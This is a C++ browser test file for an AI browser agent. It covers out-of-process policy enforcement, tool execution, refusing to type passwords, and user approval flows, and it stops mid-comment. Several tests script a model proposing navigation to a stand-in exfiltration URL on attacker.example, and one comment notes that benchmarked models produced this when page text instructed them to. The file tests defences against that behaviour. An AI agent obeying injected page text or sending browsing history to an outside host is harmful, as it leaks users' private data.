// Copyright 2026 The Zephyrus Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Proves the claim ADR 0001 actually makes.
//
// The Rust tests cover the policy, the cxx tests cover the language boundary,
// and the service unit tests cover mojo serialization -- but all three run
// in-process. None of them shows that the kernel runs anywhere other than the
// browser, which is the entire point of the decision. This test watches for a
// real service process to be launched and checks it is not the browser's own.

#include "base/functional/bind.h"
#include "base/process/process.h"
#include "base/run_loop.h"
#include "base/task/single_thread_task_runner.h"
#include "base/time/time.h"
#include "base/test/bind.h"
#include "chrome/browser/ui/browser.h"
#include "chrome/browser/ui/tabs/tab_strip_model.h"
#include "chrome/browser/ui/views/frame/browser_view.h"
#include "chrome/browser/ui/views/frame/zephyrus_agent_panel.h"
#include "ui/views/layout/box_layout_view.h"
#include "chrome/browser/ui/views/frame/zephyrus_agent_task_controller.h"
#include "chrome/browser/ui/views/frame/zephyrus_agent_tool_surface.h"
#include "chrome/browser/zephyrus/agent/agent_kernel_client.h"
#include "chrome/browser/zephyrus/agent/tool_executor.h"
#include "chrome/browser/zephyrus/agent/dev_model_client.h"
#include "chrome/browser/zephyrus/agent/tool_runner_impl.h"
#include "chrome/browser/profiles/profile.h"
#include "mojo/public/cpp/bindings/receiver.h"
#include "chrome/test/base/in_process_browser_test.h"
#include "base/json/json_reader.h"
#include "base/values.h"
#include "chrome/test/base/ui_test_utils.h"
#include "content/public/browser/service_process_host.h"
#include "content/public/browser/service_process_info.h"
#include "content/public/test/browser_test.h"
#include "content/public/test/browser_test_utils.h"
#include "net/test/embedded_test_server/embedded_test_server.h"
#include "net/test/embedded_test_server/http_request.h"
#include "net/test/embedded_test_server/http_response.h"
#include "testing/gtest/include/gtest/gtest.h"

namespace zephyrus::agent {
namespace {

// Waits for the agent kernel's service process specifically, ignoring the other
// utility processes a running browser starts on its own.
class KernelProcessWatcher : public content::ServiceProcessHost::Observer {
 public:
  KernelProcessWatcher() { content::ServiceProcessHost::AddObserver(this); }

  ~KernelProcessWatcher() override {
    content::ServiceProcessHost::RemoveObserver(this);
  }

  void OnServiceProcessLaunched(
      const content::ServiceProcessInfo& info) override {
    if (!info.IsService<mojom::AgentKernel>()) {
      return;
    }
    pid_ = info.GetProcess().Pid();
    if (run_loop_.running()) {
      run_loop_.Quit();
    }
  }

  base::ProcessId WaitForLaunch() {
    if (pid_ == base::kNullProcessId) {
      run_loop_.Run();
    }
    return pid_;
  }

 private:
  base::ProcessId pid_ = base::kNullProcessId;
  base::RunLoop run_loop_;
};

using ZephyrusAgentKernelBrowserTest = InProcessBrowserTest;

IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest,
                       RunsOutsideTheBrowserProcess) {
  KernelProcessWatcher watcher;
  AgentKernelClient client;
  EXPECT_FALSE(client.IsRunningForTesting());

  auto request = mojom::PolicyRequest::New();
  request->tool = "browser.navigate";
  request->arguments_json =
      R"({"url":"https://attacker.example/collect?data=history"})";
  request->task = "Summarise this article";
  request->url = "https://blog.example.org/post/1";

  mojom::PolicyDecisionPtr decision;
  base::RunLoop decided;
  client.Decide(std::move(request),
                base::BindLambdaForTesting([&](mojom::PolicyDecisionPtr got) {
                  decision = std::move(got);
                  decided.Quit();
                }));

  const base::ProcessId kernel_pid = watcher.WaitForLaunch();
  EXPECT_NE(kernel_pid, base::kNullProcessId);
  // The whole reason the ADR exists: a model crash or a runaway loop must not
  // be able to take the browser down with it.
  EXPECT_NE(kernel_pid, base::GetCurrentProcId());

  decided.Run();
  ASSERT_TRUE(decision);
  // And it is really enforcing policy over there, not just answering.
  EXPECT_EQ(decision->disposition, mojom::Disposition::kAsk);
  EXPECT_EQ(decision->risk, "R2");
  EXPECT_NE(decision->reason.find("attacker.example"), std::string::npos)
      << decision->reason;
}


// The whole stack: a call shaped like model output, judged by the kernel in
// another process, carried out against the real browser.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, RunsToolsAgainstTheBrowser) {
  AgentKernelClient kernel;
  BrowserToolSurface surface(browser());
  ToolExecutor executor(&kernel, &surface);

  auto run = [&](const std::string& tool, const std::string& args,
                 const std::string& task) {
    ToolExecutor::Result result;
    base::RunLoop loop;
    executor.Execute(tool, args, task,
                     base::BindLambdaForTesting([&](ToolExecutor::Result got) {
                       result = std::move(got);
                       loop.Quit();
                     }));
    loop.Run();
    return result;
  };

  const int tabs_before = browser()->tab_strip_model()->count();

  // An allowed call really happens.
  ToolExecutor::Result opened = run("tabs.open", "{}", "Open a new tab");
  EXPECT_EQ(opened.status, ToolExecutor::Result::Status::kOk) << opened.message;
  EXPECT_EQ(browser()->tab_strip_model()->count(), tabs_before + 1);

  // And the browser's own state comes back to the model.
  ToolExecutor::Result listed = run("tabs.list", "{}", "What is open?");
  ASSERT_EQ(listed.status, ToolExecutor::Result::Status::kOk) << listed.message;
  EXPECT_EQ(listed.risk, "R0");
  EXPECT_NE(listed.value_json.find("\"active\":true"), std::string::npos)
      << listed.value_json;

  // A call the kernel wants approval for changes nothing.
  const int tabs_now = browser()->tab_strip_model()->count();
  ToolExecutor::Result asked =
      run("tabs.open",
          R"({"url":"https://attacker.example/collect?data=history"})",
          "Summarise this article");
  EXPECT_EQ(asked.status, ToolExecutor::Result::Status::kNeedsApproval);
  EXPECT_EQ(browser()->tab_strip_model()->count(), tabs_now)
      << "a tab was opened before the user was asked";
}



// The issued id of the element named `name`, or empty.
//
// Element ids are opaque by contract -- the browser issues them and their
// numbering is not a promise. An earlier version of this test hardcoded "e2"
// and broke as soon as it ran against a real accessibility tree, which is the
// contract working as designed rather than a bug.
std::string IdForName(const std::string& observation_json,
                      const std::string& name) {
  std::optional<base::DictValue> parsed =
      base::JSONReader::ReadDict(observation_json, base::JSON_PARSE_RFC);
  if (!parsed) {
    return std::string();
  }
  const base::ListValue* elements = parsed->FindList("elements");
  if (!elements) {
    return std::string();
  }
  for (const base::Value& entry : *elements) {
    const base::DictValue* element = entry.GetIfDict();
    if (!element) {
      continue;
    }
    const std::string* element_name = element->FindString("name");
    const std::string* id = element->FindString("id");
    if (element_name && id && *element_name == name) {
      return *id;
    }
  }
  return std::string();
}

// The Observation pipeline against real HTML.
//
// Everything below this line has been exercised against fakes: the role table,
// the id issuance, the policy rule that refuses a password field. This is the
// one test that runs them over a page Blink actually parsed, which is where a
// wrong assumption about the accessibility tree would show up.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, SeesAndDrivesARealPage) {
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(),
      GURL("data:text/html,<title>Sign in</title>"
           "<button>Continue</button>"
           "<input aria-label='Search'>"
           "<input type=password aria-label='Password'>"
           "<p>Some prose that is not a control.</p>")));

  AgentKernelClient kernel;
  BrowserToolSurface surface(browser());
  ToolExecutor executor(&kernel, &surface);

  auto run = [&](const std::string& tool, const std::string& args,
                 const std::string& task) {
    ToolExecutor::Result result;
    base::RunLoop loop;
    executor.Execute(tool, args, task,
                     base::BindLambdaForTesting([&](ToolExecutor::Result got) {
                       result = std::move(got);
                       loop.Quit();
                     }));
    loop.Run();
    return result;
  };

  // Look at the page.
  ToolExecutor::Result seen =
      run("page.observe", R"({"level":1})", "Sign in to the site");
  ASSERT_EQ(seen.status, ToolExecutor::Result::Status::kOk) << seen.message;

  // The controls are offered, with the roles the policy engine reasons about.
  EXPECT_NE(seen.value_json.find("Continue"), std::string::npos)
      << seen.value_json;
  EXPECT_NE(seen.value_json.find("\"password\""), std::string::npos)
      << "a protected field must be reported as a password, or the policy "
         "cannot tell it apart: "
      << seen.value_json;
  // ...and the prose is not, because it is not a control.
  EXPECT_EQ(seen.value_json.find("\"role\":\"paragraph\""), std::string::npos)
      << seen.value_json;

  // Finding narrows to what was asked for.
  ToolExecutor::Result found =
      run("page.find", R"({"query":"search"})", "Sign in to the site");
  ASSERT_EQ(found.status, ToolExecutor::Result::Status::kOk) << found.message;
  EXPECT_NE(found.value_json.find("Search"), std::string::npos)
      << found.value_json;

  // Typing into an ordinary field really reaches the page: the value comes back
  // in the next Observation.
  const std::string search_id = IdForName(seen.value_json, "Search");
  ASSERT_FALSE(search_id.empty()) << seen.value_json;
  ToolExecutor::Result typed =
      run("page.type",
          R"({"element_id":")" + search_id + R"(","text":"thermal throttling"})",
          "Search for thermal throttling");
  ASSERT_EQ(typed.status, ToolExecutor::Result::Status::kOk) << typed.message;

  // Accessibility actions are dispatched, not awaited: AccessibilityPerformAction
  // has no completion signal, so a snapshot taken immediately afterwards can
  // beat the renderer. Looking again until it lands is what an agent loop does
  // too -- act, then look -- so the retry is the honest shape of the test
  // rather than a workaround hiding a race.
  ToolExecutor::Result after;
  for (int attempt = 0; attempt < 20; ++attempt) {
    after = run("page.observe", R"({"level":1})", "Search for thermal throttling");
    ASSERT_EQ(after.status, ToolExecutor::Result::Status::kOk);
    if (after.value_json.find("thermal throttling") != std::string::npos) {
      break;
    }
    base::RunLoop delay;
    base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
        FROM_HERE, delay.QuitClosure(), base::Milliseconds(50));
    delay.Run();
  }
  EXPECT_NE(after.value_json.find("thermal throttling"), std::string::npos)
      << after.value_json;

  // And the credential rule holds over a real password field, which is the
  // whole reason the Observation reports the role at all.
  const std::string password_id = IdForName(after.value_json, "Password");
  ASSERT_FALSE(password_id.empty()) << after.value_json;
  ToolExecutor::Result refused =
      run("page.type",
          R"({"element_id":")" + password_id + R"(","text":"hunter2"})",
          "Log me in");
  EXPECT_EQ(refused.status, ToolExecutor::Result::Status::kDenied);
  EXPECT_EQ(refused.risk, "R3");
}


// Every key in the contract, and the identity the page actually receives.
//
// page.press is the one tool that does not go through the accessibility API --
// keys are not something it expresses, and kDoDefault on a node is a click, not
// a keystroke. So this is the only proof that the synthesised events are real:
// the page's own keydown listener reports what arrived.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, SendsEveryKeyInTheContract) {
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(),
      GURL("data:text/html,<title>none</title><input aria-label='Field'>"
           "<script>document.addEventListener('keydown',function(e){"
           "document.title='key:'+e.key;});</script>")));

  AgentKernelClient kernel;
  BrowserToolSurface surface(browser());
  ToolExecutor executor(&kernel, &surface);

  auto run = [&](const std::string& tool, const std::string& args) {
    ToolExecutor::Result result;
    base::RunLoop loop;
    executor.Execute(tool, args, "Try the keys",
                     base::BindLambdaForTesting([&](ToolExecutor::Result got) {
                       result = std::move(got);
                       loop.Quit();
                     }));
    loop.Run();
    return result;
  };

  for (const char* key :
       {"Enter", "Escape", "Tab", "ArrowUp", "ArrowDown", "Backspace"}) {
    ToolExecutor::Result pressed =
        run("page.press", std::string(R"({"key":")") + key + R"("})");
    ASSERT_EQ(pressed.status, ToolExecutor::Result::Status::kOk)
        << key << ": " << pressed.message;

    // The page updates its title from a listener, so look until it lands.
    const std::string expected = std::string("key:") + key;
    std::string title;
    for (int attempt = 0; attempt < 20; ++attempt) {
      ToolExecutor::Result seen = run("page.observe", R"({"level":0})");
      ASSERT_EQ(seen.status, ToolExecutor::Result::Status::kOk);
      title = seen.value_json;
      if (title.find(expected) != std::string::npos) {
        break;
      }
      base::RunLoop delay;
      base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
          FROM_HERE, delay.QuitClosure(), base::Milliseconds(50));
      delay.Run();
    }
    EXPECT_NE(title.find(expected), std::string::npos)
        << "the page did not receive " << key << ": " << title;
  }
}


// A scripted model, standing in for the one that does not exist yet.
class ScriptedModel : public mojom::AgentModel {
 public:
  explicit ScriptedModel(std::vector<std::string> responses)
      : responses_(std::move(responses)) {}

  mojo::PendingRemote<mojom::AgentModel> Bind() {
    return receiver_.BindNewPipeAndPassRemote();
  }

  void Propose(const std::string& system_prompt,
               const std::string& user_prompt,
               ProposeCallback callback) override {
    last_user_prompt = user_prompt;
    const size_t index = std::min(calls_++, responses_.size() - 1);
    std::move(callback).Run(responses_[index]);
  }

  std::string last_user_prompt;

 private:
  std::vector<std::string> responses_;
  size_t calls_ = 0;
  mojo::Receiver<mojom::AgentModel> receiver_{this};
};

// The whole feature, end to end.
//
// A task in the user's words goes to a loop running in another process; that
// loop looks at a real page through the browser, judges what the model proposed
// with the real policy engine, and acts on a real tab. Every layer this session
// built is in this one call.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, RunsATaskEndToEnd) {
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(),
      GURL("data:text/html,<title>Specs</title>"
           "<button>Continue</button><p>Thermal design power is 45W.</p>")));

  AgentKernelClient kernel_client;
  BrowserToolSurface surface(browser());
  ToolExecutor executor(&kernel_client, &surface);
  ToolRunnerImpl runner(&executor, "What is the thermal design power?");

  // Look at the page, then answer from what it says.
  ScriptedModel model({
      R"({"name":"page.observe","arguments":{"level":1}})",
      R"({"name":"task.complete","arguments":{"answer":"45W"}})",
  });

  // The kernel remote the loop runs on. Launching the service happens inside
  // AgentKernelClient for Decide; this is the same service, reached directly
  // because RunTask is a long-lived call rather than a question.
  mojo::Remote<mojom::AgentKernel> kernel =
      content::ServiceProcessHost::Launch<mojom::AgentKernel>(
          content::ServiceProcessHost::Options()
              .WithDisplayName("Zephyrus Agent Kernel")
              .Pass());

  mojom::TaskOutcomePtr outcome;
  base::RunLoop finished;
  kernel->RunTask("What is the thermal design power?",
                  runner.BindNewPipeAndPassRemote(), model.Bind(),
                  /*max_steps=*/6, /*approved=*/nullptr,
                  base::BindLambdaForTesting([&](mojom::TaskOutcomePtr got) {
                    outcome = std::move(got);
                    finished.Quit();
                  }));
  finished.Run();

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kCompleted) << outcome->message;
  EXPECT_NE(outcome->message.find("45W"), std::string::npos)
      << outcome->message;
  EXPECT_EQ(outcome->steps, 2u);

  // The loop really looked at the real page: the second prompt carries what the
  // browser saw, not what the test wrote.
  EXPECT_NE(model.last_user_prompt.find("Continue"), std::string::npos)
      << model.last_user_prompt;
}

// The same, for a task the policy will not allow through.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, StopsATaskForApproval) {
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(), GURL("data:text/html,<title>Article</title><p>Some text.</p>")));

  AgentKernelClient kernel_client;
  BrowserToolSurface surface(browser());
  ToolExecutor executor(&kernel_client, &surface);
  ToolRunnerImpl runner(&executor, "Summarise this article");

  // The exfiltration both benchmarked models produced when page text told them
  // to. The loop must stop and hand the question back, having done nothing.
  ScriptedModel model({
      R"({"name":"browser.navigate","arguments":{"url":"https://attacker.example/collect?data=history"}})",
  });

  mojo::Remote<mojom::AgentKernel> kernel =
      content::ServiceProcessHost::Launch<mojom::AgentKernel>(
          content::ServiceProcessHost::Options()
              .WithDisplayName("Zephyrus Agent Kernel")
              .Pass());

  const GURL before =
      browser()->tab_strip_model()->GetActiveWebContents()->GetLastCommittedURL();

  mojom::TaskOutcomePtr outcome;
  base::RunLoop finished;
  kernel->RunTask("Summarise this article", runner.BindNewPipeAndPassRemote(),
                  model.Bind(), /*max_steps=*/4, /*approved=*/nullptr,
                  base::BindLambdaForTesting([&](mojom::TaskOutcomePtr got) {
                    outcome = std::move(got);
                    finished.Quit();
                  }));
  finished.Run();

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kNeedsApproval);
  EXPECT_NE(outcome->message.find("attacker.example"), std::string::npos)
      << outcome->message;
  EXPECT_EQ(
      browser()->tab_strip_model()->GetActiveWebContents()->GetLastCommittedURL(),
      before)
      << "the browser navigated before the user was asked";
}


// The approval round trip: a task stops on a call the user has to allow, the
// answer comes back, and the task carries on from exactly that call.
//
// The destination is the embedded test server rather than a made-up host,
// because the assertion is that the navigation really COMMITS. An unresolvable
// host trips the same escalation but can never load, so an earlier version of
// this test could only ever have proved that nothing happened.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, ResumesAfterApproval) {
  ASSERT_TRUE(embedded_test_server()->Start());
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(), GURL("data:text/html,<title>Report</title><p>Q3 figures.</p>")));

  // An origin the user never named, carrying a query. That is the exfiltration
  // shape the kernel stops on, and it is also a page that exists.
  const GURL destination = embedded_test_server()->GetURL("/title2.html?d=1");

  ScriptedModel model({
      R"({"name":"browser.navigate","arguments":{"url":")" + destination.spec() +
          R"("}})",
      R"({"name":"task.complete","arguments":{"answer":"sent"}})",
  });

  ZephyrusAgentTaskController controller(browser());
  controller.SetAutoAnswerForTesting(true);

  mojom::TaskOutcomePtr outcome;
  base::RunLoop finished;
  controller.StartTask("Summarise this article", model.Bind(), /*max_steps=*/6,
                       base::BindLambdaForTesting(
                           [&](mojom::TaskOutcomePtr got) {
                             outcome = std::move(got);
                             finished.Quit();
                           }));
  finished.Run();

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kCompleted) << outcome->message;

  // Waited for explicitly: the navigation tools report that a load was STARTED,
  // not that it finished, so the task can complete while the page is still on
  // its way. That is a real property of the executor, not a quirk of this test
  // -- see the note on ToolSurface.
  content::WebContents* contents =
      browser()->tab_strip_model()->GetActiveWebContents();
  ASSERT_TRUE(content::WaitForLoadStop(contents));
  EXPECT_EQ(contents->GetLastCommittedURL(), destination);
}

IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, DecliningStopsTheTask) {
  const GURL start("data:text/html,<title>Report</title><p>Q3 figures.</p>");
  ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), start));

  ASSERT_TRUE(embedded_test_server()->Start());
  ScriptedModel model({
      R"({"name":"browser.navigate","arguments":{"url":")" +
          embedded_test_server()->GetURL("/title2.html?d=1").spec() + R"("}})",
      R"({"name":"task.complete","arguments":{"answer":"sent"}})",
  });

  ZephyrusAgentTaskController controller(browser());
  controller.SetAutoAnswerForTesting(false);

  mojom::TaskOutcomePtr outcome;
  base::RunLoop finished;
  controller.StartTask("Summarise this article", model.Bind(), /*max_steps=*/6,
                       base::BindLambdaForTesting(
                           [&](mojom::TaskOutcomePtr got) {
                             outcome = std::move(got);
                             finished.Quit();
                           }));
  finished.Run();

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kAskedTheUser);
  EXPECT_NE(outcome->message.find("declined"), std::string::npos)
      << outcome->message;
  // Declining means it did not happen, and the task did not carry on to the
  // model's next idea either.
  EXPECT_EQ(
      browser()->tab_strip_model()->GetActiveWebContents()->GetLastCommittedURL(),
      start);
}


// The development model client, over real HTTP, driving the real loop.
//
// The test server stands in for Ollama. That works precisely because the client
// refuses anything but loopback and the embedded server IS loopback -- the
// safety rule and the test setup agree, which is a good sign for both.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, DrivesATaskThroughTheDevModel) {
  // Replies like an Ollama chat endpoint: look at the page, then answer.
  int turn = 0;
  embedded_test_server()->RegisterRequestHandler(base::BindLambdaForTesting(
      [&](const net::test_server::HttpRequest& request)
          -> std::unique_ptr<net::test_server::HttpResponse> {
        if (request.relative_url != "/api/chat") {
          return nullptr;
        }
        // The prompt really arrived, with the page in it.
        EXPECT_NE(request.content.find("TASK:"), std::string::npos);

        auto response = std::make_unique<net::test_server::BasicHttpResponse>();
        response->set_content_type("application/json");
        response->set_content(
            turn++ == 0
                ? R"({"message":{"content":"{\"name\":\"page.observe\",\"arguments\":{\"level\":1}}"}})"
                : R"({"message":{"content":"{\"name\":\"task.complete\",\"arguments\":{\"answer\":\"45W\"}}"}})");
        return response;
      }));
  ASSERT_TRUE(embedded_test_server()->Start());

  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(),
      GURL("data:text/html,<title>Specs</title>"
           "<p>Thermal design power is 45W.</p>")));

  std::unique_ptr<DevModelClient> model = DevModelClient::Create(
      embedded_test_server()->base_url(), "test-model",
      browser()->profile()->GetURLLoaderFactory());
  ASSERT_TRUE(model) << "the test server should be loopback";

  ZephyrusAgentTaskController controller(browser());

  mojom::TaskOutcomePtr outcome;
  base::RunLoop finished;
  controller.StartTask("What is the thermal design power?",
                       model->BindNewPipeAndPassRemote(), /*max_steps=*/6,
                       base::BindLambdaForTesting(
                           [&](mojom::TaskOutcomePtr got) {
                             outcome = std::move(got);
                             finished.Quit();
                           }));
  finished.Run();

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kCompleted) << outcome->message;
  EXPECT_NE(outcome->message.find("45W"), std::string::npos) << outcome->message;
  EXPECT_EQ(turn, 2) << "the model was asked once per step";
}

// With no development switches there is no model, and a task started this way
// does nothing rather than half-starting. This is the state of a normal build.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, NoModelMeansNoTask) {
  ZephyrusAgentTaskController controller(browser());
  bool called = false;
  EXPECT_FALSE(controller.StartTaskWithConfiguredModel(
      "Find the specs", /*max_steps=*/4,
      base::BindLambdaForTesting(
          [&](mojom::TaskOutcomePtr) { called = true; })));
  EXPECT_FALSE(called);
}


// The panel, driven the way a person drives it.
//
// The controller tests cover the task; these cover the surface: that the panel
// takes width from the page, that the running log fills from what the browser
// actually did, and that a question can be answered in place.
class ZephyrusAgentPanelBrowserTest : public InProcessBrowserTest {
 protected:
  ZephyrusAgentPanel* panel() {
    return BrowserView::GetBrowserViewForBrowser(browser())
        ->zephyrus_agent_panel();
  }
};

IN_PROC_BROWSER_TEST_F(ZephyrusAgentPanelBrowserTest, TakesWidthFromThePageOnlyWhenOpen) {
  ASSERT_TRUE(panel());
  EXPECT_FALSE(panel()->is_open());
  EXPECT_EQ(panel()->GetReservedWidth(), 0)
      << "a closed panel must cost the page nothing";

  const int page_width = browser()
                             ->tab_strip_model()
                             ->GetActiveWebContents()
                             ->GetContainerBounds()
                             .width();

  panel()->Open();
  EXPECT_TRUE(panel()->is_open());
  EXPECT_GT(panel()->GetReservedWidth(), 0);
  BrowserView::GetBrowserViewForBrowser(browser())->DeprecatedLayoutImmediately();

  const int narrowed = browser()
                           ->tab_strip_model()
                           ->GetActiveWebContents()
                           ->GetContainerBounds()
                           .width();
  EXPECT_LT(narrowed, page_width)
      << "the page should make room rather than be covered";

  panel()->Close();
  BrowserView::GetBrowserViewForBrowser(browser())->DeprecatedLayoutImmediately();
  EXPECT_EQ(browser()
                ->tab_strip_model()
                ->GetActiveWebContents()
                ->GetContainerBounds()
                .width(),
            page_width)
      << "closing gives the width straight back";
}

IN_PROC_BROWSER_TEST_F(ZephyrusAgentPanelBrowserTest, SaysSoWhenThereIsNoModel) {
  // The ordinary state of a build nobody passed the development switches to.
  // It must say so rather than sit there looking like it is thinking.
  ASSERT_TRUE(panel());
  panel()->Open();

  ZephyrusAgentTaskController controller(browser());
  controller.SetDelegate(panel());
  EXPECT_FALSE(controller.StartTaskWithConfiguredModel(
      "Find the specs", /*max_steps=*/4,
      base::BindLambdaForTesting([](mojom::TaskOutcomePtr) {})));
}

IN_PROC_BROWSER_TEST_F(ZephyrusAgentPanelBrowserTest, AnswersAQuestionInPlace) {
  // The approval round trip through the panel rather than through a modal: the
  // task stops, the panel is asked, the answer resumes it.
  ASSERT_TRUE(embedded_test_server()->Start());
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(), GURL("data:text/html,<title>Report</title><p>Q3.</p>")));
  ASSERT_TRUE(panel());
  panel()->Open();

  const GURL destination = embedded_test_server()->GetURL("/title2.html?d=1");
  ScriptedModel model({
      R"({"name":"browser.navigate","arguments":{"url":")" + destination.spec() +
          R"("}})",
      R"({"name":"task.complete","arguments":{"answer":"done"}})",
  });

  ZephyrusAgentTaskController controller(browser());
  controller.SetDelegate(panel());

  mojom::TaskOutcomePtr outcome;
  base::RunLoop finished;
  controller.StartTask("Summarise this", model.Bind(), /*max_steps=*/6,
                       base::BindLambdaForTesting(
                           [&](mojom::TaskOutcomePtr got) {
                             outcome = std::move(got);
                             finished.Quit();
                           }));

  // Wait for the question to actually arrive before answering it. RunUntilIdle
  // is not enough: the kernel's service process has to be launched, the page
  // observed and the model asked before anything reaches the panel, and
  // answering a question that has not been asked is a no-op that then hangs on
  // a reply nobody will send.
  for (int attempt = 0; attempt < 100 && !panel()->HasQuestionForTesting();
       ++attempt) {
    base::RunLoop delay;
    base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
        FROM_HERE, delay.QuitClosure(), base::Milliseconds(50));
    delay.Run();
  }
  ASSERT_TRUE(panel()->HasQuestionForTesting())
      << "the task never stopped to ask";

  // Answering yes is what a click on "Allow once" does.
  panel()->AnswerApprovalForTesting(true);
  finished.Run();

  ASSERT_TRUE(outcome);
  EXPECT_EQ(outcome->status, mojom::TaskStatus::kCompleted) << outcome->message;
}


// The log has to actually be on screen.
//
// This exists because two different ScrollView arrangements rendered NOTHING --
// the panel drew its title, input and button, so it looked alive, and only the
// lines were missing. Both shipped. A line with zero size, or one laid out
// beyond the panel's own bounds, is invisible however correct the code above it
// is, and nothing but a person looking at the window was catching it.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentPanelBrowserTest, LogLinesAreActuallyVisible) {
  ASSERT_TRUE(panel());
  panel()->Open();

  // No model configured, so this writes the task line and then the "no model"
  // line -- two lines, through exactly the path a real task uses.
  ZephyrusAgentTaskController controller(browser());
  controller.SetDelegate(panel());
  panel()->OnAgentProgress("Looking at the page");
  panel()->OnAgentProgress("Clicking something: Manganese");

  BrowserView::GetBrowserViewForBrowser(browser())->DeprecatedLayoutImmediately();

  const views::BoxLayoutView* log = panel()->log_for_testing();
  ASSERT_TRUE(log);
  ASSERT_GE(log->children().size(), 2u) << "the lines were never added";

  const gfx::Rect panel_bounds = panel()->GetLocalBounds();
  for (const views::View* line : log->children()) {
    EXPECT_FALSE(line->size().IsEmpty())
        << "a log line was laid out with no size, so it cannot be read";
    EXPECT_LE(line->width(), panel_bounds.width())
        << "a log line is wider than the panel, so its text runs off the side";
  }

  // The column itself must fit the panel. This is the assertion that catches
  // the ScrollView bug: without ClipHeightTo the contents keep their preferred
  // width, which for unwrapped text is far wider than the panel, and every line
  // lands off-screen to the right.
  EXPECT_GT(log->width(), 0) << "the log column has no width";
  EXPECT_LE(log->width(), panel_bounds.width())
      << "the log column is wider than the panel -- its lines are off-screen";
}


// Does typing actually reach the page's own JavaScript?
//
// A real task stalled here: the agent typed into YouTube's search box over and
// over, the executor reported success every time, and the box stayed empty. The
// executor cannot tell -- AccessibilityPerformAction has no result -- so the
// only way to know is to ask a page that reports back.
//
// The page sets its title from an `input` event listener. If the title changes,
// the value reached the DOM *and* the page's own handlers ran, which is what a
// framework-driven search box needs in order to notice.
IN_PROC_BROWSER_TEST_F(ZephyrusAgentKernelBrowserTest, TypingReachesThePagesOwnHandlers) {
  ASSERT_TRUE(ui_test_utils::NavigateToURL(
      browser(),
      GURL("data:text/html,<title>none</title>"
           "<input aria-label='Search'>"
           "<script>document.querySelector('input')"
           ".addEventListener('input',function(e){"
           "document.title='typed:'+e.target.value;});</script>")));

  AgentKernelClient kernel;
  BrowserToolSurface surface(browser());
  ToolExecutor executor(&kernel, &surface);

  auto run = [&](const std::string& tool, const std::string& args) {
    ToolExecutor::Result result;
    base::RunLoop loop;
    executor.Execute(tool, args, "Search this page",
                     base::BindLambdaForTesting([&](ToolExecutor::Result got) {
                       result = std::move(got);
                       loop.Quit();
                     }));
    loop.Run();
    return result;
  };

  ToolExecutor::Result seen = run("page.observe", R"({"level":1})");
  ASSERT_EQ(seen.status, ToolExecutor::Result::Status::kOk) << seen.message;
  const std::string field = IdForName(seen.value_json, "Search");
  ASSERT_FALSE(field.empty()) << seen.value_json;

  ToolExecutor::Result typed =
      run("page.type",
          R"({"element_id":")" + field + R"(","text":"sidemen"})");
  ASSERT_EQ(typed.status, ToolExecutor::Result::Status::kOk) << typed.message;

  // Look until the page reports it, since the action is dispatched rather than
  // awaited.
  std::string title;
  for (int attempt = 0; attempt < 20; ++attempt) {
    ToolExecutor::Result after = run("page.observe", R"({"level":0})");
    ASSERT_EQ(after.status, ToolExecutor::Result::Status::kOk);
    title = after.value_json;
    if (title.find("typed:sidemen") != std::string::npos) {
      break;
    }
    base::RunLoop delay;
    base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
        FROM_HERE, delay.QuitClosure(), base::Milliseconds(50));
    delay.Run();
  }

  EXPECT_NE(title.find("typed:sidemen"), std::string::npos)
      << "the value never reached the page's own input handler: " << title;

  // And -- the part that decides whether a task can make progress -- the next
  // Observation has to REPORT that value back.
  //
  // The model only learns that typing worked by seeing it in the next look. If
  // the field comes back empty it will type again, and again, which is exactly
  // the loop a real task got stuck in: eight identical "Filling something in"
  // steps until the budget ran out.
  ToolExecutor::Result relooked = run("page.observe", R"({"level":1})");
  ASSERT_EQ(relooked.status, ToolExecutor::Result::Status::kOk);
  EXPECT_NE(relooked.value_json.find("sidemen"), std::string::npos)
      << "the Observation does not report what was typed, so the model cannot "
         "tell it succeeded: "
      << relooked.value_json;
}


// Type, then press Enter, and the page must see BOTH.
//
// This is the test that judges whether typing actually focuses. It was disabled
// while it documented an unfixed gap; page.type now clicks the field with a
// synthesised pointer before setting its value, and this is what says whether
// that worked. If it fails again, the thing to change is the mechanism, not
// this test -- it has already outlasted four wrong theories.
//
// What was measured before the pointer, with an ACTIVE window:
//   - kSetValue on a node WORKS: the value lands and the page's input event
//     fires.
//   - kFocus on the SAME node does nothing. So does kDoDefault.
//   - The accessibility tree afterwards reports NOTHING focused.
//   - The keypress therefore arrives at the document, not the field, so a form
//     never submits. This is why a task could type a search term and never
//     search.
//
// Ruled out along the way: mojo pipe ordering between the accessibility and
